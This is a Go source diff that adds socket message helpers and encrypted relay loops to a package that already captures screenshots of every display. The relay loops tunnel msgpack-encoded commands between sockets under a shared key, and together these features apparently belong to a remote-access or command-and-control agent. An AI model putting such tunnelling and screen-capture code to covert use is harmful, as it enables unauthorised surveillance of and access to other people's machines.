@@ -3,14 +3,24 @@ package functions
 import (
 	"archive/zip"
 	"bytes"
+	"context"
+	"encoding/binary"
+	"errors"
+	"fmt"
 	"github.com/kbinani/screenshot"
+	"github.com/vmihailenco/msgpack/v5"
+	"gopher/utils"
 	"image/png"
 	"io"
 	"io/fs"
+	"net"
 	"os"
 	"path/filepath"
 	"runtime"
+	"sync"
 )
+
+/// FS
 
 func CopyFile(src, dst string, info fs.FileInfo) error {
 	source, err := os.Open(src)
@@ -336,4 +346,149 @@ func Screenshots() (map[int][]byte, error) {
 		result[i] = buf.Bytes()
 	}
 	return result, nil
+}
+
+/// NET
+
+func ConnRead(conn net.Conn, size int) ([]byte, error) {
+	if size <= 0 {
+		return nil, fmt.Errorf("incorrected size: %d", size)
+	}
+
+	message := make([]byte, 0, size)
+	tmpBuff := make([]byte, 1024)
+	readSize := 0
+
+	for readSize < size {
+		toRead := size - readSize
+		if toRead < len(tmpBuff) {
+			tmpBuff = tmpBuff[:toRead]
+		}
+
+		n, err := conn.Read(tmpBuff)
+		if err != nil {
+			return nil, err
+		}
+
+		message = append(message, tmpBuff[:n]...)
+		readSize += n
+	}
+	return message, nil
+}
+
+func RecvMsg(conn net.Conn) ([]byte, error) {
+	bufLen, err := ConnRead(conn, 4)
+	if err != nil {
+		return nil, err
+	}
+	msgLen := binary.BigEndian.Uint32(bufLen)
+
+	return ConnRead(conn, int(msgLen))
+}
+
+func SendMsg(conn net.Conn, data []byte) error {
+	if conn == nil {
+		return errors.New("conn is nil")
+	}
+
+	msgLen := make([]byte, 4)
+	binary.BigEndian.PutUint32(msgLen, uint32(len(data)))
+	message := append(msgLen, data...)
+	_, err := conn.Write(message)
+	return err
+}
+
+func RelayMsgToSocket(ctx context.Context, cancel context.CancelFunc, wg *sync.WaitGroup, src net.Conn, dst net.Conn, tunKey []byte) {
+	defer wg.Done()
+
+	procSrvRead := func(data []byte) []byte {
+		var inMessage utils.Message
+		recvData, err := utils.DecryptData(data, tunKey)
+		if err != nil {
+			return nil
+		}
+
+		err = msgpack.Unmarshal(recvData, &inMessage)
+		if err != nil {
+			return nil
+		}
+
+		var buffer bytes.Buffer
+		for _, obj := range inMessage.Object {
+			var command utils.Command
+			err = msgpack.Unmarshal(obj, &command)
+			if err != nil {
+				return nil
+			}
+
+			if command.Code == 1 {
+				cancel()
+				return nil
+			}
+
+			buffer.Write(command.Data)
+		}
+
+		return buffer.Bytes()
+	}
+
+	for {
+		select {
+		case <-ctx.Done():
+			return
+		default:
+			data, err := RecvMsg(src)
+			if err != nil {
+				cancel()
+				continue
+			}
+			processed := procSrvRead(data)
+			if processed != nil {
+				written := 0
+				for written < len(processed) {
+					w, err := dst.Write(processed[written:])
+					if err != nil {
+						cancel()
+						continue
+					}
+					written += w
+				}
+			}
+		}
+	}
+}
+
+func RelaySocketToMsg(ctx context.Context, cancel context.CancelFunc, wg *sync.WaitGroup, src net.Conn, dst net.Conn, tunKey []byte) {
+	defer wg.Done()
+
+	procSrvWrite := func(data []byte) []byte {
+		buf, err := utils.EncryptData(data, tunKey)
+		if err != nil {
+			return nil
+		}
+		return buf
+	}
+
+	buf := make([]byte, 10000)
+	for {
+		select {
+		case <-ctx.Done():
+			return
+		default:
+			n, err := src.Read(buf)
+			if err != nil {
+				cancel()
+				continue
+			}
+			processed := procSrvWrite(buf[:n])
+			if processed == nil {
+				continue
+			}
+			err = SendMsg(dst, processed)
+			if err != nil {
+				cancel()
+				continue
+			}
+		}
+	}
 }
